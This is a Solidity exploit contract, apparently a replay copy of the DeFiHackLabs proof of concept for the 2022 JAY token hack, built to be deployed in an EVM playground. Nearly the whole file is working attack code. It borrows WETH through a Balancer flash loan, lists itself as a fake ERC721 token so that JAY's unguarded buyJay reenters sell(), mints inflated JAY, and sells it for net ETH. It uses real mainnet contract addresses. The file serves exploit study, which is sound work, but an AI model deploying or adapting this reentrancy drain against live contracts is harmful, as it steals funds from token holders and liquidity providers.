// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-JAY).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest`): the Balancer `receiveFlashLoan` callback AND the reentrancy
// hook (`transferFrom`) both live on the test itself, so there is no standalone
// contract to deploy. This file is a faithful, self-contained copy of that inline
// attack so the playground can deploy one contract and record `run()`. Logic and
// constants are copied verbatim from test/JAY_exp.sol (DeFiHackLabs).
//
// Root cause: JAY.buyJay calls IERC721(_tokenAddress[id]).transferFrom(...) on a
// caller-supplied address with NO validation and NO nonReentrant guard, then
// _mint(msg.sender, ETHtoJAY(msg.value)...) reads live totalSupply()/balance that
// the reentrant sell() just shrank. The attacker lists ITSELF as the "ERC721 token";
// its transferFrom reenters JAY.sell(), burning its JAY and pulling ETH before
// buyJay's _mint runs — so the same msg.value mints an astronomically larger amount
// of JAY, which is then sold back for net ETH profit. Two cycles net ~15.32 ETH.

interface IJay {
    function buyJay(
        address[] memory erc721TokenAddress,
        uint256[] memory erc721Ids,
        address[] memory erc1155TokenAddress,
        uint256[] memory erc1155Ids,
        uint256[] memory erc1155Amounts
    ) external payable;
    function sell(uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address dst, uint256 wad) external returns (bool);
}

contract JAYDrain {
    IJay private constant JAY_TOKEN = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
    IBalancerVault private constant BALANCER_VAULT =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH private constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 private constant BORROWED_ETH = 72.5 ether;

    function run() external {
        // Flash-loan 72.5 WETH from Balancer. The vault calls back into
        // receiveFlashLoan below, where the whole attack runs.
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BORROWED_ETH;
        // userData is unused by this attack (the original exploit's bytes were for
        // a different vector); a placeholder is fine.
        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, "");
    }

    // Balancer flashLoan callback.
    function receiveFlashLoan(
        IERC20[] memory, /* tokens */
        uint256[] memory amounts,
        uint256[] memory, /* feeAmounts */
        bytes memory /* userData */
    ) external {
        require(msg.sender == address(BALANCER_VAULT));

        // WETH -> ETH.
        WETH_TOKEN.withdraw(amounts[0]);

        // --- Cycle 1 ---
        // Seed a real JAY balance so the reentrant sell has something to burn.
        JAY_TOKEN.buyJay{value: 22 ether}(
            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
        );

        // The exploit step: pass this contract as the "ERC721 token address".
        // JAY.buyJayWithERC721 calls this.transferFrom(...) → reenters JAY.sell()
        // before buyJay's _mint, inflating the subsequent mint.
        address[] memory erc721TokenAddress = new address[](1);
        erc721TokenAddress[0] = address(this);
        uint256[] memory erc721Ids = new uint256[](1);
        erc721Ids[0] = 0;

        JAY_TOKEN.buyJay{value: 50.5 ether}(
            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)
        );
        // Sell the inflated mint back for ETH.
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));

        // --- Cycle 2 ---
        JAY_TOKEN.buyJay{value: 3.5 ether}(
            new address[](0), new uint256[](0), new address[](0), new uint256[](0), new uint256[](0)
        );
        JAY_TOKEN.buyJay{value: 8 ether}(
            erc721TokenAddress, erc721Ids, new address[](0), new uint256[](0), new uint256[](0)
        );
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));

        // Repay the flash loan: wrap ETH -> WETH and return it to the vault.
        WETH_TOKEN.deposit{value: BORROWED_ETH}();
        WETH_TOKEN.transfer(address(BALANCER_VAULT), BORROWED_ETH);
    }

    // The reentrancy hook. JAY.buyJayWithERC721 calls
    // IERC721(this).transferFrom(msg.sender, JAY, id); this ignores the args and
    // reenters JAY.sell(), burning this contract's JAY and pulling ETH *before*
    // buyJay's _mint runs — so ETHtoJAY(msg.value) is recomputed against a tiny
    // totalSupply and a large balance, minting vastly more JAY.
    function transferFrom(address, /*sender*/ address, /*recipient*/ uint256 /*amount*/ ) external {
        JAY_TOKEN.sell(JAY_TOKEN.balanceOf(address(this)));
    }

    receive() external payable {}
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
}
